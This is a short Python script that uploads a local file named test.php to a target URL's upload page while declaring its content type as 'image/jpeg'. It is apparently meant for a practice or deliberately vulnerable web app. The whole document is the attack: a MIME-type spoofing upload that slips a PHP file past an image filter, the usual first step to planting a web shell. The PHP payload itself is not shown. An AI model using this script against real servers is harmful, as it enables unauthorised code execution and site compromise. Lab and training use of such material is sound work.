import sys
import requests

PARAMS = {
	'page': 'upload'
}
DATA = {
	'Upload': 'Upload'
}

FILE = [('uploaded', ('test.php', open('/Users/romainkirszbaum/Desktop/test.php', 'rb'), 'image/jpeg'))]

if __name__ == '__main__':
	BASE_URL = sys.argv[1]
	print(requests.post(BASE_URL, data=DATA, files=FILE, params=PARAMS).text)